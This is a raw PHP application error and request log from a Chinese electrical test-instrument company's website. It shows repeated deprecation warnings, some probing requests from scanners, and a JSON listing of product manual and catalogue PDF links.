[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T07:42:37+08:00 ] 113.215.189.97 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T07:52:29+08:00 ] 52.167.144.190 GET www.punalei.cn/ldcms/sanxiangjiaoliubianpindianyuan/guanyupunalei.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T07:52:30+08:00 ] 52.167.144.190 GET www.punalei.cn/ldcms/sanxiangjiaoliubianpindianyuan/guanyupunalei.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T07:54:40+08:00 ] 204.76.203.18 GET 120.24.147.77/bins/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T07:54:40+08:00 ] 204.76.203.18 GET 120.24.147.77/bins/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:01:02+08:00 ] 40.77.167.43 GET www.punalei.cn/ldcms/xiazaizhongxin.html?type=4&name=%E5%BA%94%E7%94%A8%E9%A9%B1%E5%8A%A8%E8%BD%AF%E4%BB%B6
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ download ] 4
---------------------------------------------------------------
[ 2026-03-18T08:01:02+08:00 ] 40.77.167.43 GET www.punalei.cn/ldcms/xiazaizhongxin.html?type=4&name=%E5%BA%94%E7%94%A8%E9%A9%B1%E5%8A%A8%E8%BD%AF%E4%BB%B6
[ download ] [{"id":242,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9510\\15\\20\\30\\45\\60-\\TSS\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":244,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9530\\60-\\GSD\\GSS\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":260,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9505\\10-\\D\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":262,"title":"\u5355\u76f8\u578bPNL300-A\u4ea4\u6d41\u7cfb\u52170.2\u7ea7","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20260309\/ed50ce8156e54152582ff3356228093d.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"},{"id":263,"title":"\u6cc4\u6f0f\u7535\u6d41\u6d4b\u8bd5\u4eeaPNL2675\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":264,"title":" \u63a5\u5730\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2678XM\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":268,"title":"\u591a\u901a\u9053\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2818-X\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":270,"title":"\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2511\u6570\u7801\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/405841dc3a1790083cdfb28d392a51b6.pdf","agreement":"","drive":"","resource":""},{"id":271,"title":"\u591a\u8def\u6e29\u5ea6\u5de1\u68c0\u6d4b\u8bd5\u4eeaP2000-X PLUS\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/88bebf25cc9f75277abfb9945aa00ebc.pdf","agreement":"","drive":"","resource":""},{"id":272,"title":"\u624b\u6301\u591a\u8def\u6e29\u5ea6\u6d4b\u8bd5\u4eeaP300-S\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/4eeb7970b89981df90d0560b8dbe2ff8.pdf","agreement":"","drive":"","resource":""},{"id":290,"title":"\u4ea4\u6d41\u6052\u6d41\u6e90","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":291,"title":"\u4e09\u76f8\u578bPNL300-S\u7cfb\u52170.2\u7ea7","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/5f7e3f318e22f4a79790e06a66ac2625.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/5f7e3f318e22f4a79790e06a66ac2625.pdf"},{"id":295,"title":"\u5c0f\u529f\u7387\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/3c0024e1494ae6a3a5ee57c6e55308d8.pdf","agreement":"","drive":"","resource":""},{"id":298,"title":"\u533b\u7528\u6cc4\u6f0f\u7535\u6d41\u6d4b\u8bd5\u4eea","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":299,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u66763U\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":300,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 10kw-15kw\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":303,"title":"\u5b89\u89c4\u7efc\u5408\u6821\u51c6\u70b9\u68c0\u5de5\u88c5","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":304,"title":"\u8010\u538b\u6d4b\u8bd5\u4eea5KV\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":306,"title":"\u8010\u538b\u6d4b\u8bd5\u4eea10KV\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":307,"title":"\u8010\u538b\u6d4b\u8bd5\u4eea20KV\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":308,"title":"\u7a0b\u63a7\u8010\u538b\u7edd\u7f18PNL7110\\PNL7122\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":309,"title":"\u5b89\u5168\u7efc\u5408\u6027\u80fd\u5206\u6790\u4eeaPNL9950\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":311,"title":"\u5355\u4e09\u76f8 - \u5b89\u5168\u7efc\u5408\u6027\u80fd\u5206\u6790\u4eeaPNL9950-C\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":312,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9515\\20\\30\\45\\60-\\TSD\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":314,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9520\\30-\\D\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":315,"title":"\u7edd\u7f18\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2682N\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/7c63757a23e5e98e594bf1b4bf50445a.pdf","agreement":"","drive":"","resource":""},{"id":316,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9510\\15\\20-\\TD\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":317,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9530\\50-\\G\\D\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":318,"title":"\u4e09\u76f8\u578b\u8c10\u6ce2PNL300-SX\u7cfb\u52170.2\u7ea7","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/c3915be2288c668d42fab75c77d557b6.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/c3915be2288c668d42fab75c77d557b6.pdf"},{"id":319,"title":"\u7edd\u7f18\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2683AL\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/29f9570871ea60e153dce0b05698a13e.pdf","agreement":"","drive":"","resource":""},{"id":320,"title":"\u5bbd\u8303\u56f4\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2513\/15\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/d94e60f7d79a2b3b6d9b106bf787c6db.pdf","agreement":"","drive":"","resource":""},{"id":321,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u66764U\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":322,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u66765U\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":323,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u667620K\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":324,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u667640K\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":325,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u667660K\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":326,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 20kw-30kw\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":327,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 40kw-60kw\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":328,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 75kw-90kw\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":329,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-U \u9ad8\u538b\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":330,"title":"\u4ea4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/18ff267d1dc26e503128741d78be61d7.pdf","agreement":"","drive":"","resource":""},{"id":331,"title":"\u4ea4\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/04725819a3c60dff3e1af918dc2ccaf2.pdf","agreement":"","drive":"","resource":""},{"id":332,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/639e5850541f700cdc64053f1d7a18a7.pdf","agreement":"","drive":"","resource":""},{"id":333,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/3c0024e1494ae6a3a5ee57c6e55308d8.pdf","agreement":"","drive":"","resource":""},{"id":337,"title":"\u5355\u76f8\u578bPNL300-C\u4ea4\u76f4\u6d41\u7cfb\u52170.2\u7ea7","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"},{"id":338,"title":"\u80fd\u6548\u578bPNL300-E\u4ea4\u76f4\u6d41\u7cfb\u52170.2\u7ea7","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"}]
---------------------------------------------------------------
[ 2026-03-18T08:01:02+08:00 ] 40.77.167.43 GET www.punalei.cn/ldcms/xiazaizhongxin.html?type=4&name=%E5%BA%94%E7%94%A8%E9%A9%B1%E5%8A%A8%E8%BD%AF%E4%BB%B6
[ download ] []
---------------------------------------------------------------
[ 2026-03-18T08:02:09+08:00 ] 64.62.197.107 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T08:03:07+08:00 ] 64.62.197.107 GET 120.24.147.77/webui/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:03:07+08:00 ] 64.62.197.107 GET 120.24.147.77/webui/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:05:02+08:00 ] 64.62.197.114 GET 120.24.147.77/favicon.ico
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:05:02+08:00 ] 64.62.197.114 GET 120.24.147.77/favicon.ico
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:06:33+08:00 ] 64.62.197.107 GET 120.24.147.77/geoserver/web/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:06:34+08:00 ] 64.62.197.107 GET 120.24.147.77/geoserver/web/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:17:47+08:00 ] 71.6.199.87 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T08:18:37+08:00 ] 8.208.10.94 GET 120.24.147.77/dns-query?dns=6csBAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:37+08:00 ] 8.208.10.94 GET 120.24.147.77/dns-query?dns=6csBAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:37+08:00 ] 8.208.10.94 POST 120.24.147.77/dns-query
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:37+08:00 ] 8.208.10.94 GET 120.24.147.77/dns-query
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:38+08:00 ] 8.208.10.94 GET 120.24.147.77/dns-query?name=1.odns.m.dnsmeasure.top&type=A
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:38+08:00 ] 8.208.10.94 GET 120.24.147.77/dns-query?name=1.odns.m.dnsmeasure.top&type=A
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
